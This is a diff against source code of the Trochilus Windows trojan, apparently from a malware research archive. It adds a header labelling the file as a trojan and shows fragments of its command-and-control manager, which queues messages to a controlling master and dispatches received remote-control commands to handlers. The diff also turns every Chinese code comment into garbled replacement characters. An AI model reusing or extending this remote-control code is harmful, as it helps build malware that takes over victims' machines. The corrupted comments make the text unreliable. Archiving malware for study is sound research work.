@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #include "stdafx.h"
 #include "env/Wow64.h"
 #include "HttpComm.h"
@@ -131,7 +142,7 @@ BOOL CommManager::PushMsgToMaster( COMM_NAME commName, CommData& data )
 
 	if (NULL == m_commList[commName]) return FALSE;
 
-	//½«ÏûÏ¢ÐòÁÐ»¯ÎªbyteData
+	//ï¿½ï¿½ï¿½ï¿½Ï¢ï¿½ï¿½ï¿½Ð»ï¿½ÎªbyteData
 	ByteBuffer byteData;
 
 	data.SetClientID(m_clientid.c_str());
@@ -301,7 +312,7 @@ void CommManager::MessageSenderProc()
 
 		Sleep(m_dwMsgIntervalMS);
 
-		//Èç¹ûÅäÖÃÁËµÚÒ»´ÎÉÏÏßÊ±¼ä,ÔòÐèÒª¼ì²â²¢µÈ´ý
+		//ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ëµï¿½Ò»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ê±ï¿½ï¿½,ï¿½ï¿½ï¿½ï¿½Òªï¿½ï¿½â²¢ï¿½È´ï¿½
 		if (bFirstConnect && bWaitUntil)
 		{
 			static int iCount = 0;
@@ -321,7 +332,7 @@ void CommManager::MessageSenderProc()
 			}
 		}
 
-		//´ÓCutupProtocol»ñÈ¡´ý·¢ËÍÊý¾Ý
+		//ï¿½ï¿½CutupProtocolï¿½ï¿½È¡ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 		ByteBuffer toSendByteData;
 		COMM_NAME commName;
 
@@ -381,7 +392,7 @@ void CommManager::MessageSenderProc()
 			continue;
 		}
 
-		//²éÑ¯ÏûÏ¢´¦ÀíÕß
+		//ï¿½ï¿½Ñ¯ï¿½ï¿½Ï¢ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 		FnExecuteRCCommand fnCallback = NULL;
 		LPVOID lpParameter = NULL;
 		if (! Manager::GetInstanceRef().QueryCommandHandler(msgid, &fnCallback, &lpParameter)
@@ -399,7 +410,7 @@ void CommManager::MessageSenderProc()
 
 		debugLog(_T("recv msgid[%I64u]. try to handle it"), msgid);
 
-		//Ê¹ÓÃÏß³Ì³Ø´¦Àí£¬»òÕßÖ±½Ó´¦Àí
+		//Ê¹ï¿½ï¿½ï¿½ß³Ì³Ø´ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ö±ï¿½Ó´ï¿½ï¿½ï¿½
 		if (recvData.UsingPoolThread())
 		{
 			PEXECUTOR_PARAMETER p = new EXECUTOR_PARAMETER;
